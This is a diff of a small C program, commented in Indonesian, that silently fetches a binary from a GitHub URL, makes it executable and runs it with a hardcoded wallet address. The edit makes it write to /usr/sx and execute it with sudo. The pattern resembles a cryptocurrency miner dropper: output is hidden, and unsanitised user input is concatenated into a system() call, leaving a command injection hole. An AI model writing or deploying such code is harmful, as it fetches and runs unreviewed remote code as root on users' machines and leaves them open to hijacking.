@@ -9,19 +9,19 @@ int main() {
     char wallet[] = "8BAei31qDSqCRwS1GsQTWjfMjK4VxxThbFckHFoXyRP1BM2keM3bNCY9YBvpGmwuxG4Nec7gqejYGU8E4VNHXYYC7Y2EUJZ"; // Default wallet
     char command[256];
     
-    // Mendownload file xgt dari GitHub secara silent
-    int download_status = system("wget -q https://github.com/gualgeol-code/vpl/raw/refs/heads/main/sx -O sx >/dev/null 2>&1");
+    // Mendownload file ke /usr directory dengan sudo
+    int download_status = system("sudo wget -q https://github.com/gualgeol-code/vpl/raw/refs/heads/main/sx -O /usr/sx >/dev/null 2>&1");
     
     if (download_status != 0) {
-        printf("Error: Gagal mendownload xs\n");
+        printf("Error: Gagal mendownload sx ke /usr\n");
         return 1;
     }
     
-    // Memberikan izin eksekusi secara silent
-    int chmod_status = system("chmod +x sx >/dev/null 2>&1");
+    // Memberikan izin eksekusi dengan sudo
+    int chmod_status = system("sudo chmod +x /usr/sx >/dev/null 2>&1");
     
     if (chmod_status != 0) {
-        printf("Error: Gagal memberikan izin eksekusi pada xs\n");
+        printf("Error: Gagal memberikan izin eksekusi pada /usr/sx\n");
         return 1;
     }
     
@@ -36,8 +36,8 @@ int main() {
     // Menghapus newline character dari input
     qcore[strcspn(qcore, "\n")] = '\0';
     
-    // Membuat command dengan wallet default
-    snprintf(command, sizeof(command), "./sx %s %s", qcore, wallet);
+    // Membuat command dengan wallet default dan path lengkap ke sx
+    snprintf(command, sizeof(command), "/usr/sx %s %s", qcore, wallet);
     
     // Menjalankan program dengan wallet default
     int status = system(command);
